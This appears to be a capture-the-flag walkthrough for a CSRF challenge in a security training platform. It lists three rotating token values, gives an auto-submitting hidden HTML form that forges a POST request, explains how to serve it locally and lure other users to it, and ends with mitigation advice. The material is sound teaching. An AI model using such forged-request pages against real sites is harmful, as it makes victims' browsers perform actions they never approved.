# Cross Site Request Forgery Challenge Six

## Description
`POST /user/csrfchallengesix/plusplus`
With the following parameters: `userId=your_user_id & csrfToken=csrf_token`

Where your_user_id is the ID of the user whose CSRF counter is being incremented. Your ID is: `3297ff70ad130c5b6858593e2087452b0d2afe71`. Any user other than you may increment your counter for this challenge.

## Solution
This challenge uses a rotating system with three specific CSRF tokens that cycle through each other:
```
c4ca4238a0b923820dcc509a6f75849b
eccbc87e4b5ce2fe28308fd9f2a7baf3
c81e728d9d4c2f636f067f89cc14862c
```

Although this system appears more secure than previous challenges, the limited token space still makes it vulnerable to brute force attacks.

## Steps to Reproduce

### 1 Step
Create your HTML file with the necessary information:
- userid: `3297ff70ad130c5b6858593e2087452b0d2afe71`
- csrfToken: Use one of the three possible tokens
- shepherd-domain: where Shepherd is running (in this example, localhost)

```html
<form name="malForm" action="https://localhost/user/csrfchallengesix/plusplus" method="POST">
    <input type="hidden" name="userId" value="3297ff70ad130c5b6858593e2087452b0d2afe71"/>
    <input type="hidden" name="csrfToken" value="c4ca4238a0b923820dcc509a6f75849b"/>
    <input type="submit"/>
</form>
<script> document.malForm.submit(); </script>
```

### 2 Step
Run your server using Python's built-in HTTP server:

```bash
python3 -m http.server 8080
```

⚠️ Don't forget you can't finish this challenge alone - other users must visit your page.

### 3 Step
Post your URL to the forum and wait for other users to visit. With only three possible tokens, you have a 1 in 3 chance of matching with any visiting user.

## Exploit
When another user visits your page, if their current CSRF token matches the one in your form, the request will succeed and increment your counter.

## Impact
This vulnerability demonstrates that even with a slightly more complex token system, a small token space is still insufficient to prevent brute force attacks.

## Mitigation
To properly implement CSRF protection:
- Use cryptographically secure random tokens with high entropy (at least 128 bits)
- Generate unique tokens for each user session and form
- Validate tokens on the server side for all sensitive operations
- Implement proper token expiration mechanisms
- Use the SameSite cookie attribute as an additional defense layer

---

[← Previous](./csrf-5.md) | [Next →](./csrf-7.md)

